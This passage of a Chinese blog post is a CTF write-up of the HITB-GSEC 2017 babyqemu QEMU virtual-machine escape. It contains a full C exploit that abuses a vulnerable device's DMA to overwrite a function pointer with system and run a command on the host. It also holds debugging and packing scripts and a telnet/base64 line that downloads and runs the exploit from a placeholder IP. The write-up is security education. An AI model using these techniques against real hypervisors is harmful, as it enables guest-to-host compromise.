class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;ctype.h&gt;</span><br><span class="line">#include &lt;termios.h&gt;</span><br><span class="line">#include &lt;assert.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include &lt;sys/io.h&gt;</span><br><span class="line"></span><br><span class="line">#define MAP_SIZE 4096UL</span><br><span class="line">#define MAP_MASK (MAP_SIZE - 1)</span><br><span class="line"></span><br><span class="line">#define DMA_BASE 0x40000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#define PAGE_SHIFT  12</span><br><span class="line">#define PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span><br><span class="line">#define PFN_PRESENT (1ull &lt;&lt; 63)</span><br><span class="line">#define PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span><br><span class="line"></span><br><span class="line">char* pci_device_name = &quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;;</span><br><span class="line"></span><br><span class="line">unsigned char* tmpbuf;</span><br><span class="line">uint64_t tmpbuf_phys_addr;</span><br><span class="line">unsigned char* mmio_base;</span><br><span class="line"></span><br><span class="line">unsigned char* getMMIOBase()&#123;</span><br><span class="line">    </span><br><span class="line">    int fd;</span><br><span class="line">    if((fd = open(pci_device_name, O_RDWR | O_SYNC)) == -1) &#123;</span><br><span class="line">        perror(&quot;open pci device&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    mmio_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);</span><br><span class="line">    if(mmio_base == (void *) -1) &#123;</span><br><span class="line">        perror(&quot;mmap&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    return mmio_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 获取页内偏移</span><br><span class="line">uint32_t page_offset(uint32_t addr)</span><br><span class="line">&#123;</span><br><span class="line">    // addr &amp; 0xfff</span><br><span class="line">    return addr &amp; ((1 &lt;&lt; PAGE_SHIFT) - 1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint64_t gva_to_gfn(void *addr)</span><br><span class="line">&#123;</span><br><span class="line">    uint64_t pme, gfn;</span><br><span class="line">    size_t offset;</span><br><span class="line"></span><br><span class="line">    int fd;</span><br><span class="line">    fd = open(&quot;/proc/self/pagemap&quot;, O_RDONLY);</span><br><span class="line">    if (fd &lt; 0) &#123;</span><br><span class="line">        perror(&quot;open&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // printf(&quot;pfn_item_offset : %p\n&quot;, (uintptr_t)addr &gt;&gt; 9);</span><br><span class="line">    offset = ((uintptr_t)addr &gt;&gt; 9) &amp; ~7;</span><br><span class="line"></span><br><span class="line">    ////下面是网上其他人的代码，只是为了理解上面的代码</span><br><span class="line">    //一开始除以 0x1000  （getpagesize=0x1000，4k对齐，而且本来低12位就是页内索引，需要去掉），即除以2**12, 这就获取了页号了，</span><br><span class="line">    //pagemap中一个地址64位，即8字节，也即sizeof(uint64_t)，所以有了页号后，我们需要乘以8去找到对应的偏移从而获得对应的物理地址</span><br><span class="line">    //最终  vir/2^12 * 8 = (vir / 2^9) &amp; ~7 </span><br><span class="line">    //这跟上面的右移9正好对应，但是为什么要 &amp; ~7 ,因为你  vir &gt;&gt; 12 &lt;&lt; 3 , 跟vir &gt;&gt; 9 是有区别的，vir &gt;&gt; 12 &lt;&lt; 3低3位肯定是0，所以通过&amp; ~7将低3位置0</span><br><span class="line">    // int page_size=getpagesize();</span><br><span class="line">    // unsigned long vir_page_idx = vir/page_size;</span><br><span class="line">    // unsigned long pfn_item_offset = vir_page_idx*sizeof(uint64_t);</span><br><span class="line"></span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, 8);</span><br><span class="line">    // 确保页面存在——page is present.</span><br><span class="line">    if (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        return -1;</span><br><span class="line">    // physical frame number </span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    return gfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint64_t gva_to_gpa(void *addr)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    uint64_t gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != -1);</span><br><span class="line">    return (gfn &lt;&lt; PAGE_SHIFT) | page_offset((uint64_t)addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void mmio_write(uint64_t addr, uint64_t value)</span><br><span class="line">&#123;</span><br><span class="line">    *((uint64_t*)(mmio_base + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint64_t mmio_read(uint64_t addr)</span><br><span class="line">&#123;</span><br><span class="line">    return *((uint64_t*)(mmio_base + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void set_cnt(uint64_t val)</span><br><span class="line">&#123;</span><br><span class="line">    mmio_write(144, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void set_src(uint64_t val)</span><br><span class="line">&#123;</span><br><span class="line">    mmio_write(128, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void set_dst(uint64_t val)</span><br><span class="line">&#123;</span><br><span class="line">    mmio_write(136, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void start_dma_timer(uint64_t val)&#123;</span><br><span class="line">    mmio_write(152, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void dma_read(uint64_t offset, uint64_t  cnt)&#123;</span><br><span class="line"></span><br><span class="line">    // 设置dma_buf的索引</span><br><span class="line">    set_src(DMA_BASE + offset);</span><br><span class="line">    // 设置读取后要写入的物理地址</span><br><span class="line">    set_dst(tmpbuf_phys_addr);</span><br><span class="line">    // 设置读取的大小</span><br><span class="line">    set_cnt(cnt);</span><br><span class="line">    // 触发hitb_dma_timer</span><br><span class="line">    start_dma_timer(1|2);</span><br><span class="line">    // 等待上面的执行完</span><br><span class="line">    sleep(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void dma_write(uint64_t offset, char* buf, uint64_t  cnt)</span><br><span class="line">&#123;</span><br><span class="line">    // 将我们要写的内容先复制到tmpbuf</span><br><span class="line">    memcpy(tmpbuf, buf, cnt);</span><br><span class="line">    //设置物理地址（要从这读取写到dma_buf[opaque-&gt;dma.dst-0x40000]）</span><br><span class="line">    set_src(tmpbuf_phys_addr);</span><br><span class="line">    // 设置dma_buf的索引</span><br><span class="line">    set_dst(DMA_BASE + offset);</span><br><span class="line">    // 设置写入大小</span><br><span class="line">    set_cnt(cnt);</span><br><span class="line">    // 触发hitb_dma_timer</span><br><span class="line">    start_dma_timer(1);</span><br><span class="line">    // 等待上面的执行完</span><br><span class="line">    sleep(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void dma_write_qword(uint64_t offset, uint64_t val)</span><br><span class="line">&#123;</span><br><span class="line">    dma_write(offset, (char *)&amp;val, 8);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void dma_enc_read(uint64_t offset, uint64_t  cnt)</span><br><span class="line">&#123;</span><br><span class="line">    // 设置dma_buf的索引</span><br><span class="line">    set_src(DMA_BASE + offset);</span><br><span class="line">    // 设置读取后要写入的物理地址</span><br><span class="line">    set_dst(tmpbuf_phys_addr);</span><br><span class="line">    // 设置读取的大小</span><br><span class="line">    set_cnt(cnt);</span><br><span class="line">    // 触发hitb_dma_timer</span><br><span class="line">    start_dma_timer(1|2|4);</span><br><span class="line">    // 等待上面的执行完</span><br><span class="line">    sleep(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char const *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    getMMIOBase();</span><br><span class="line">    printf(&quot;mmio_base Resource0Base: %p\n&quot;, mmio_base);</span><br><span class="line"></span><br><span class="line">    tmpbuf = malloc(0x1000);</span><br><span class="line">    tmpbuf_phys_addr = gva_to_gpa(tmpbuf);</span><br><span class="line">    printf(&quot;gva_to_gpa tmpbuf_phys_addr %p\n&quot;, (void*)tmpbuf_phys_addr);</span><br><span class="line"></span><br><span class="line">    //just test</span><br><span class="line">    // dma_write(0, &quot;giantbranch&quot;, 11);</span><br><span class="line">    // dma_read(0, 11);</span><br><span class="line">    // printf(&quot;tmpbuf: %s\n&quot;, tmpbuf);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 将enc函数指针写到tmpbuf_phys_addr,之后通过tmpbuf读出即可</span><br><span class="line">    dma_read(4096, 8);</span><br><span class="line">    uint64_t hitb_enc_addr = *((uint64_t*)tmpbuf);</span><br><span class="line">    uint64_t binary_base_addr = hitb_enc_addr - 0x283DD0;</span><br><span class="line">    uint64_t system_addr = binary_base_addr + 0x1FDB18;</span><br><span class="line">    printf(&quot;hitb_enc_addr: 0x%lx\n&quot;, hitb_enc_addr);</span><br><span class="line">    printf(&quot;binary_base_addr: 0x%lx\n&quot;, binary_base_addr);</span><br><span class="line">    printf(&quot;system_addr: 0x%lx\n&quot;, system_addr);</span><br><span class="line"></span><br><span class="line">    // 覆盖enc函数指针为system地址</span><br><span class="line">    dma_write_qword(4096, system_addr);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    // 将我们要执行的命令复制到tmpbuf中</span><br><span class="line">    // char* command = &quot;gnome-calculator&quot;;</span><br><span class="line">    // char* command = &quot;pwd&quot;;</span><br><span class="line">    char* command = &quot;cat flag&quot;;</span><br><span class="line">    dma_write(0x200, command, strlen(command));</span><br><span class="line"></span><br><span class="line">    // 触发hitb_dma_timer中的enc函数,从而调用syetem</span><br><span class="line">    // 下面的666设置的是cnt，可以是任意值，没什么影响</span><br><span class="line">    dma_enc_read(0x200, 666);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="关于调试"><a href="#关于调试" class="headerlink" title="关于调试"></a>关于调试</h1><p>由于有符号，直接下断点即可，由于启动期间我这中断多多次，所以搞了很多个c</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">giantbranch@ubuntu:~/qemu_escape/HITB-GSEC-2017-babyqemu$ cat start.txt</span><br><span class="line">run -initrd ./rootfs.cpio -kernel ./vmlinuz-4.8.0-52-generic -append &apos;console=ttyS0 root=/dev/ram oops=panic panic=1&apos; -enable-kvm -monitor /dev/null -m 64M --nographic  -L ./dependency/usr/local/share/qemu -L pc-bios -device hitb,id=vda</span><br><span class="line">b hitb_dma_timer</span><br><span class="line">b hitb_mmio_write</span><br><span class="line">c</span><br><span class="line">c</span><br><span class="line">c</span><br><span class="line">c</span><br><span class="line">c</span><br><span class="line">c</span><br><span class="line"></span><br><span class="line">giantbranch@ubuntu:~/qemu_escape/HITB-GSEC-2017-babyqemu$ sudo gdb -q ./qemu-system-x86_64</span><br><span class="line">pwndbg: loaded 176 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</span><br><span class="line">Reading symbols from ./qemu-system-x86_64...done.</span><br><span class="line">gdb-peda$ source start.txt</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">[New Thread 0x7ffff0c35700 (LWP 28226)]</span><br><span class="line">[New Thread 0x7ffff0434700 (LWP 28229)]</span><br><span class="line">[New Thread 0x7fffed3ff700 (LWP 28231)]</span><br></pre></td></tr></table></figure>
+
+<h1 id="关于exp传到qemu中"><a href="#关于exp传到qemu中" class="headerlink" title="关于exp传到qemu中"></a>关于exp传到qemu中</h1><p>由于这个ssh和scp都不奏效，而且网络也不通，所以就只能解开它的文件系统，把exp放进去root家目录，之后再压缩</p>
+<p>解压命令是<code>cpio -idmv &lt; rootfs.cpio</code>,注意将rootfs.cpio放入一个新建的文件夹内再解开，有时候rootfs.cpio被gz二次压缩了可以用<code>gunzip ./rootfs.cpio.gz</code>解开，再执行上面的命令即可。</p>
+<p>那么每次修改为exp，执行下面的脚本即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">giantbranch@ubuntu:~/qemu_escape/HITB-GSEC-2017-babyqemu$ cat ./cpexptorootfs.sh</span><br><span class="line">gcc -o exp -static exp.c</span><br><span class="line">cp ./exp ./rootfs/root</span><br><span class="line">cd ./rootfs &amp;&amp; find . | cpio -o --format=newc &gt; ../rootfs.cpio</span><br></pre></td></tr></table></figure>
+
+<p>当然在实际比赛中，网络肯定是通的，而且这里的镜像是一个类似于嵌入式的简单系统，没有nc，但是有busybox，busybox支持telnet命令，所以可以通过下面示例进行下载exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># telnet XXX.XXX.XXX.XXX 6666 &gt; pwn.b64</span><br><span class="line"># base64 -d pwn.b64 &gt; pwn</span><br><span class="line"># chmod +x pwn</span><br><span class="line"># ./pwn</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>主要参考<br><a href="https://kitctf.de/writeups/hitb2017/babyqemu" target="_blank" rel="noopener">https://kitctf.de/writeups/hitb2017/babyqemu</a></p>
+<p>其他参考<br><a href="https://github.com/coreos/qemu/blob/ed988a3274c8e08ce220419cb48ef81a16754ea4/include/qemu/timer.h#L414" target="_blank" rel="noopener">https://github.com/coreos/qemu/blob/ed988a3274c8e08ce220419cb48ef81a16754ea4/include/qemu/timer.h#L414</a><br><a href="https://github.com/qemu/qemu" target="_blank" rel="noopener">https://github.com/qemu/qemu</a><br><a href="https://github.com/qemu/qemu/blob/f2cfa1229e539ee1bb1822912075cf25538ad6b9/include/qemu/timer.h#L96" target="_blank" rel="noopener">https://github.com/qemu/qemu/blob/f2cfa1229e539ee1bb1822912075cf25538ad6b9/include/qemu/timer.h#L96</a><br><a href="https://github.com/qemu/qemu/blob/f2cfa1229e539ee1bb1822912075cf25538ad6b9/include/qemu/timer.h#L666" target="_blank" rel="noopener">https://github.com/qemu/qemu/blob/f2cfa1229e539ee1bb1822912075cf25538ad6b9/include/qemu/timer.h#L666</a><br><a href="https://zh.wikipedia.org/wiki/%E7%9B%B4%E6%8E%A5%E8%A8%98%E6%86%B6%E9%AB%94%E5%AD%98%E5%8F%96" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E7%9B%B4%E6%8E%A5%E8%A8%98%E6%86%B6%E9%AB%94%E5%AD%98%E5%8F%96</a><br><a href="https://www.giantbranch.cn/2019/07/17/VM%20escape%20%E4%B9%8B%20QEMU%20Case%20Study/">https://www.giantbranch.cn/2019/07/17/VM%20escape%20%E4%B9%8B%20QEMU%20Case%20Study/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>自愿打赏专区</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="http://paypic.giantbranch.cn/wechat.png" alt="giantbranch 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="http://paypic.giantbranch.cn/alipay.png" alt="giantbranch 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+    
+      <div class="footer-custom">
+        <b>paypal: <a href="https://www.paypal.me/giantbranch">https://www.paypal.me/giantbranch</a> </b>
+      </div>
+    
+
+    
+    <div style="padding: 10px 0; margin: 20px auto; width: 100%; text-align: center;">
+    	<div><img src="http://paypic.giantbranch.cn/ask.png"></div>
+    </div>
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    giantbranch
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://www.giantbranch.cn/2020/01/02/CTF QEMU 虚拟机逃逸之HITB-GSEC-2017-babyqemu/" title="CTF QEMU 虚拟机逃逸之HITB-GSEC-2017-babyqemu">https://www.giantbranch.cn/2020/01/02/CTF QEMU 虚拟机逃逸之HITB-GSEC-2017-babyqemu/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/qemu/" rel="tag"># qemu</a>
+          
+            <a href="/tags/vm-escape/" rel="tag"># vm escape</a>
+          
+            <a href="/tags/虚拟机逃逸/" rel="tag"># 虚拟机逃逸</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/12/03/CTF QEMU 虚拟机逃逸之BlizzardCTF 2017 Strng/" rel="next" title="CTF QEMU 虚拟机逃逸之BlizzardCTF 2017 Strng">
+                <i class="fa fa-chevron-left"></i> CTF QEMU 虚拟机逃逸之BlizzardCTF 2017 Strng
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/01/05/QEMU 的一些基础知识及QOM(Qemu Object Model)的部分相关源码阅读/" rel="prev" title="QEMU 的一些基础知识及QOM(Qemu Object Model)的部分相关源码阅读">
+                QEMU 的一些基础知识及QOM(Qemu Object Model)的部分相关源码阅读 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+    <div class="footer-custom">
+	<b>假如你看不到评论，可能是你访问Disqus被墙了，请使用代理访问</b>
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+  
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">giantbranch</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">160</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">201</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/giantbranch" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://twitter.com/giantbranch" target="_blank" title="Twitter">
+                    
+                      <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-globe"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.csdn.net/u012763794" title="my csdn blog" target="_blank">my csdn blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://oldblog.giantbranch.cn/" title="old blog" target="_blank">old blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://weaponx.site/" title="WeaponX" target="_blank">WeaponX</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.tasfa.cn/" title="Tasfa" target="_blank">Tasfa</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://matshao.com/" title="MatShao" target="_blank">MatShao</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#熟悉题目，顺便介绍基础知识"><span class="nav-number">1.</span> <span class="nav-text">熟悉题目，顺便介绍基础知识</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MMIO函数"><span class="nav-number">2.</span> <span class="nav-text">MMIO函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hitb-dma-timer"><span class="nav-number">3.</span> <span class="nav-text">hitb_dma_timer</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞利用"><span class="nav-number">4.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#关于调试"><span class="nav-number">5.</span> <span class="nav-text">关于调试</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#关于exp传到qemu中"><span class="nav-number">6.</span> <span class="nav-text">关于exp传到qemu中</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">7.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">giantbranch</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
+<div class="footer-custom">
+<!-- <a href="https://beian.miit.gov.cn/">粤ICP备16051028号-1</a> -->
+<br>
+这是我的新博客，网站建于2017年10月
+<!-- <br>以下UV,PV统计始于2018.06.23 -->
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://giantbranch.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://www.giantbranch.cn/2020/01/02/CTF QEMU 虚拟机逃逸之HITB-GSEC-2017-babyqemu/';
+          this.page.identifier = '2020/01/02/CTF QEMU 虚拟机逃逸之HITB-GSEC-2017-babyqemu/';
+          this.page.title = 'CTF QEMU 虚拟机逃逸之HITB-GSEC-2017-babyqemu';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://giantbranch.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
